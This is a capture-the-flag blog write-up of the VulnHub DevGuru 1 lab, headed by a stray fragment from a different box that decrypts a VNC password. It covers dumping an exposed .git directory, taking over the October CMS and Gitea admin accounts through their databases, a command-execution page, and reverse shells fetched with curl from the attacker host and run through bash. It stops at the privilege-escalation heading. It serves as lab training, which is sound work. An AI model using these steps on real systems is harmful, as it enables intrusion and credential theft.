<p><img src="/assets/images/alfa/screenshot-4.png" alt="" /></p>

<p>To know the password in plain text we can use VNC password decrypter, for this we download the following repository, compile it and execute it, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>git clone https://github.com/jeroennijhof/vncpwd
Cloning into <span class="s1">'vncpwd'</span>...
remote: Enumerating objects: 28, <span class="k">done</span><span class="nb">.</span>
remote: Total 28 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 28
Receiving objects: 100% <span class="o">(</span>28/28<span class="o">)</span>, 22.15 KiB | 9.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
root@kali:~<span class="nv">$ </span><span class="nb">cd </span>vncpwd 
root@kali:~/vncpwd<span class="nv">$ </span>make
gcc <span class="nt">-Wall</span> <span class="nt">-g</span> <span class="nt">-o</span> vncpwd vncpwd.c d3des.c
root@kali:~/vncpwd<span class="nv">$ </span>./vncpwd ../.remote_secret 
Password: k!LL3rSs
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - DevGuru 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/devguru-1,620/">https://www.vulnhub.com/entry/devguru-1,620/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discover">Host Discover</h3>

<p>The machine was located on the ocal network with a ping scan, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.166 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap discovered three available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-n</span> 192.168.179.166 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8585/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan was performed against the target that allows version enumeration, OS detection, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,8585 192.168.179.166 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span class="o">(</span>RSA<span class="o">)</span>
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: DevGuru
| http-git:
|   192.168.179.166:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
|     Last commit message: first commit
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project <span class="nb">type</span>: PHP application <span class="o">(</span>guessed from .gitignore<span class="o">)</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Corp - DevGuru
8585/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
|     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>2147483647
|     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>40bce59ebd747dc9<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>bOt6t6idJjRQDG0jIqmcoj6NVP06MTYzNzgwOTk3NjI3NTU0NDcwNw<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Fri, 26 Nov 2021 03:12:56 GMT<span class="p">;</span> HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Nov 2021 03:12:56 GMT
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en-US"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"theme-"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"manifest"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/manifest.json"</span> <span class="nv">crossorigin</span><span class="o">=</span><span class="s2">"use-credentials"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"theme-color"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"#6cc644"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a cup of tea) is a painless
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=7710e8fb443c87f3; Path=/; HttpOnly
|     Set-Cookie: _csrf=ySgqKGOhEJ54SFeZh3FcsSaxhU06MTYzNzgwOTk3NjU5NTMwNjAxOQ; Path=/; Expires=Fri, 26 Nov 2021 03:12:56 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Nov 2021 03:12:56 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="</span>en-US<span class="s2">" class="</span>theme-<span class="s2">"&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta charset="</span>utf-8<span class="s2">"&gt;
|     &lt;meta name="</span>viewport<span class="s2">" content="</span><span class="nv">width</span><span class="o">=</span>device-width, initial-scale<span class="o">=</span>1<span class="s2">"&gt;
|     &lt;meta http-equiv="</span>x-ua-compatible<span class="s2">" content="</span><span class="nv">ie</span><span class="o">=</span>edge<span class="s2">"&gt;
|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
|     &lt;link rel="</span>manifest<span class="s2">" href="</span>/manifest.json<span class="s2">" crossorigin="</span>use-credentials<span class="s2">"&gt;
|     &lt;meta name="</span>theme-color<span class="s2">" content="</span><span class="c">#6cc644"&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
|_    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a c
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p><strong>Enumerating Service on port 80</strong></p>

<p>Visiting the web application in its home page was not possible find any valuable information.</p>

<p><img src="/assets/images/devguru/screenshot-1.png" alt="" /></p>

<p>Running gobuster will allow us to discover hidden information in the web directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://devguru.local <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-e</span> 2&gt;/dev/null
...
http://devguru.local/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23]
http://devguru.local/.htaccess            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1678]
http://devguru.local/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12669]
http://devguru.local/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18661]
http://devguru.local/About                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18661]
http://devguru.local/backend              <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 410] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/backend/backend/auth]
http://devguru.local/config               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/config/]             
http://devguru.local/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/modules/]            
http://devguru.local/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/plugins/]            
http://devguru.local/storage              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/storage/]            
http://devguru.local/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/themes/]             
http://devguru.local/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/vendor/]
</code></pre></div></div>

<p>An interesting git directory was located exposed, we will cover that later.</p>

<p><strong>Enumerating service on port 8585</strong></p>

<p>The service running on port 8585 is Gitea, it’s a lightweight code hosting solution written in Go, also the version of this product is vulnerable to Remote Code Execution Authenticated.</p>

<p><img src="/assets/images/devguru/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-3.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit Gitea 1.12.5
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
 Exploit Title                                                         |  Path
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
Gitea 1.12.5 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                   | multiple/webapps/49571.py
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
</code></pre></div></div>

<p>A user named frank was identified.</p>

<p><img src="/assets/images/devguru/screenshot-4.png" alt="" /></p>

<p>Going back to the web application on port 80, an exposed .git repository was detected, to fetch that directory from the target web server we will use GitTools.</p>

<p>We download it from the following repository:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>git clone https://github.com/internetwache/GitTools.git
</code></pre></div></div>

<p>We run the following command to dump it to our machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>GitTools/Dumper/gitdumper.sh http://192.168.179.166/.git/ <span class="nb">.</span>   
<span class="c">###########                                                                       </span>
<span class="c"># GitDumper is part of https://github.com/internetwache/GitTools         </span>
<span class="c">#                                                                                 </span>
<span class="c"># Developed and maintained by @gehaxelt from @internetwache                       </span>
<span class="c">#                                                                                 </span>
<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.          </span>
<span class="c"># Only for educational purposes!                                                  </span>
<span class="c">###########                                                                       </span>


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
<span class="o">[</span>+] Creating ./.git/
<span class="o">[</span>+] Downloaded: HEAD
<span class="o">[</span>-] Downloaded: objects/info/packs
<span class="o">[</span>+] Downloaded: description
<span class="o">[</span>+] Downloaded: config
<span class="o">[</span>+] Downloaded: COMMIT_EDITMSG
<span class="o">[</span>+] Downloaded: index
<span class="o">[</span>-] Downloaded: packed-refs
<span class="o">[</span>+] Downloaded: refs/heads/master
<span class="o">[</span>-] Downloaded: refs/remotes/origin/HEAD
<span class="o">[</span>-] Downloaded: refs/stash
<span class="o">[</span>+] Downloaded: logs/HEAD
<span class="o">[</span>+] Downloaded: logs/refs/heads/master
...
</code></pre></div></div>

<p>Then we extract the information from downloaded .git directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>GitTools/Extractor/extractor.sh ./ extracted_git
<span class="c">###########</span>
<span class="c"># Extractor is part of https://github.com/internetwache/GitTools</span>
<span class="c">#</span>
<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
<span class="c">#</span>
<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.</span>
<span class="c"># Only for educational purposes!</span>
<span class="c">###########</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating...
<span class="o">[</span>+] Found commit: 7de9115700c5656c670b34987c6fbffd39d90cf2
<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/.gitignore
<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/.htaccess
<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/README.md
<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/adminer.php
...
</code></pre></div></div>

<p>With the tree command we list the content of the extracted_git directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cd </span>extracted_git 
root@kali:~/extracted_git<span class="nv">$ </span>tree
<span class="nb">.</span>
└── 0-7de9115700c5656c670b34987c6fbffd39d90cf2
    ├── adminer.php
    ├── artisan
    ├── bootstrap
    │   ├── app.php
    │   └── autoload.php
    ├── commit-meta.txt
    ├── config
    │   ├── app.php
    │   ├── auth.php
    │   ├── broadcasting.php
    │   ├── cache.php
    │   ├── cms.php
    │   ├── cookie.php
    │   ├── database.php
    │   ├── environment.php
...
</code></pre></div></div>

<p>We can see an interesting file called database.php, It contains the credentials to the <strong>octoberdb</strong> database</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/extracted_git<span class="nv">$ </span><span class="nb">cat </span>0-7de9115700c5656c670b34987c6fbffd39d90cf2/config/database.php
...
        <span class="s1">'mysql'</span> <span class="o">=&gt;</span> <span class="o">[</span>                                                                                                                                                
            <span class="s1">'driver'</span>     <span class="o">=&gt;</span> <span class="s1">'mysql'</span>,                                                                                                                                
            <span class="s1">'engine'</span>     <span class="o">=&gt;</span> <span class="s1">'InnoDB'</span>,                                                                                                                               
            <span class="s1">'host'</span>       <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,                                                                                                                            
            <span class="s1">'port'</span>       <span class="o">=&gt;</span> 3306,                                                                                                                                   
            <span class="s1">'database'</span>   <span class="o">=&gt;</span> <span class="s1">'octoberdb'</span>,                                                                                                                            
            <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="s1">'october'</span>,                                                                                                                              
            <span class="s1">'password'</span>   <span class="o">=&gt;</span> <span class="s1">'SQ66EBYx4GT3byXH'</span>,                                                                                                                     
            <span class="s1">'charset'</span>    <span class="o">=&gt;</span> <span class="s1">'utf8mb4'</span>,                                                                                                                              
            <span class="s1">'collation'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8mb4_unicode_ci'</span>,                                                                                                                   
            <span class="s1">'prefix'</span>     <span class="o">=&gt;</span> <span class="s1">''</span>,                                                                                                                                     
            <span class="s1">'varcharmax'</span> <span class="o">=&gt;</span> 191,                                                                                                                                    
        <span class="o">]</span>,
...
</code></pre></div></div>

<p>We can access via adminer, is a full-featured database management tool written in PHP.</p>

<p><img src="/assets/images/devguru/screenshot-5.png" alt="" /></p>

<p>Below are the October CMS login credentials.</p>

<p><img src="/assets/images/devguru/screenshot-6.png" alt="" /></p>

<p>To identify the password hash we can do it with hashid, I tried to crack it but it wasn’t possible.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK'</span> | hashid
Analyzing <span class="s1">'$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK'</span>
<span class="o">[</span>+] Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> 
<span class="o">[</span>+] Woltlab Burning Board 4.x 
<span class="o">[</span>+] bcrypt
</code></pre></div></div>

<p>So I found another way, create another user in this case was possible to clone user frank, first we need to generate a password hash bcrypt.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>php <span class="nt">-r</span> <span class="s1">'echo password_hash("messier31", PASSWORD_DEFAULT)."\n";'</span>
<span class="nv">$2y$10$FLTKOyd</span>.fTxu13NW6D/kWOx3ZcvUloXp4gu8/lM2X86qAFttd2JAm
</code></pre></div></div>

<p>Then modify the fields login, email, and password as shown below:</p>

<p><img src="/assets/images/devguru/screenshot-7.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-8.png" alt="" /></p>

<p>Login to October CMS with the user created above.</p>

<p><img src="/assets/images/devguru/screenshot-9.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-10.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="october-code-execution">October Code Execution</h3>

<p>We can abuse of October CMS feature to run PHP code and execute system commands, below I created a new page that allow me pass the commands as parameters to the system function.</p>

<p><img src="/assets/images/devguru/screenshot-11.png" alt="" /></p>

<p>The id command was executed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://devguru.local/shell?cmd<span class="o">=</span><span class="nb">id                               
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>I wrote a bash reverse shell in the shell.sh file and started a web server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> <span class="o">&gt;</span> shell.sh

root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Start a netcat listener and run the following curl instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://devguru.local/shell?cmd<span class="o">=</span><span class="si">$(</span>php <span class="nt">-r</span> <span class="s2">"echo urlencode('curl 192.168.179.1/shell.sh | bash');"</span><span class="si">)</span>
</code></pre></div></div>

<p>We have a reverse shell with www-data privileges and we upgrade it to a full tty shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.166] 54394
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@devguru:/var/www/html<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

www-data@devguru:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@devguru:/var/www/html<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
</code></pre></div></div>

<p>By listing the processes we can see that gitea is running with frank privileges, the possible way to gain access as frank user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span>ps aux | <span class="nb">grep </span>frank
frank      614  4.6 26.0 1442108 128508 ?      Ssl  07:05   0:07 /usr/local/bin/gitea web <span class="nt">--config</span> /etc/gitea/app.ini
</code></pre></div></div>

<p>Listing files that belongs to user frank.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span>find / <span class="nt">-user</span> frank <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'proc\|sys'</span>
/var/backups/app.ini.bak                                                          
/usr/local/bin/gitea
</code></pre></div></div>

<p>Digging into the buckup file, the credentials for the gitea database were found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span><span class="nb">cat</span> /var/backups/app.ini.bak
...
<span class="o">[</span>database]
<span class="p">;</span> Database to use. Either <span class="s2">"mysql"</span>, <span class="s2">"postgres"</span>, <span class="s2">"mssql"</span> or <span class="s2">"sqlite3"</span><span class="nb">.</span>
DB_TYPE             <span class="o">=</span> mysql
HOST                <span class="o">=</span> 127.0.0.1:3306
NAME                <span class="o">=</span> gitea
USER                <span class="o">=</span> gitea
<span class="p">;</span> Use PASSWD <span class="o">=</span> <span class="sb">`</span>your password<span class="sb">`</span> <span class="k">for </span>quoting <span class="k">if </span>you use special characters <span class="k">in </span>the password.
PASSWD              <span class="o">=</span> UfFPTF8C8jjxVF2m
...
</code></pre></div></div>

<p>I logged in via adminer to the gitea database.</p>

<p><img src="/assets/images/devguru/screenshot-12.png" alt="" /></p>

<p>This contains to user frank with a different password hash, googling the <a href="https://docs.gitea.io/en-us/config-cheat-sheet/">gitea</a> docs, I found the format of allowed hashing algorithms, one of them is bcrypt so we can reuse the previously generated hash, and we use the clone utility to create a user similar to frank.</p>

<p><img src="/assets/images/devguru/screenshot-13.png" alt="" /></p>

<p>Login as the new user created before.</p>

<p><img src="/assets/images/devguru/screenshot-14.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-15.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-16.png" alt="" /></p>

<p>You can find the complete guide about how to exploit this vulnerability <a href="https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/">here</a>.</p>

<p>First we need to create a repository.</p>

<p><img src="/assets/images/devguru/screenshot-17.png" alt="" /></p>

<p><img src="/assets/images/devguru/screenshot-18.png" alt="" /></p>

<p>Then go to <strong>Settings -&gt; Git Hooks -&gt; Post Receive Hook,</strong> and write a shell script that will be executed after receiving a new commit.</p>

<p><img src="/assets/images/devguru/screenshot-19.png" alt="" /></p>

<p>Start a netcat listener and run the following commands on the attacking machine to get our reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">touch </span>README.md                                                                                                                                
root@kali:~<span class="nv">$ </span>git init 
root@kali:~<span class="nv">$ </span>git add README.md
root@kali:~<span class="nv">$ </span>git commit <span class="nt">-m</span> <span class="s2">"first commit"</span>
<span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 977f570] first commit
 1 file changed, 0 insertions<span class="o">(</span>+<span class="o">)</span>, 0 deletions<span class="o">(</span>-<span class="o">)</span>
 create mode 100644 README.md
root@kali:~<span class="nv">$ </span>git remote add origin http://devguru.local:8585/s4rgaz/Test.git
root@kali:~<span class="nv">$ </span>git push <span class="nt">-u</span> origin master
Username <span class="k">for</span> <span class="s1">'http://devguru.local:8585'</span>: s4rgaz
Password <span class="k">for</span> <span class="s1">'http://s4rgaz@devguru.local:8585'</span>: 
Enumerating objects: 3, <span class="k">done</span><span class="nb">.</span>
Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
Writing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, 210 bytes | 210.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Total 3 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 0
remote: <span class="nb">.</span> Processing 1 references
remote: Processed 1 references <span class="k">in </span>total
To http://devguru.local:8585/s4rgaz/Test.git
 <span class="k">*</span> <span class="o">[</span>new branch]      master -&gt; master
Branch <span class="s1">'master'</span> <span class="nb">set </span>up to track remote branch <span class="s1">'master'</span> from <span class="s1">'origin'</span><span class="nb">.</span>
</code></pre></div></div>

<p>Now we have a shell with frank’s privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.166] 56758
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>600<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">id
</span>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
&lt;ies/s4rgaz/test.git<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="err">$</span>
</code></pre></div></div>

<p>By listing sudo permissions we cannot execute sqlite3 as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>frank on devguru:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User frank may run the following commands on devguru:
    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> NOPASSWD: /usr/bin/sqlite3
</code></pre></div></div>

<p>A vulnerability exists regarding this setting in versions of sudo prior to 1.8.28, we can check it by consulting the version of sudo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">--version</span>
<span class="nb">sudo</span> <span class="nt">--version</span>
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
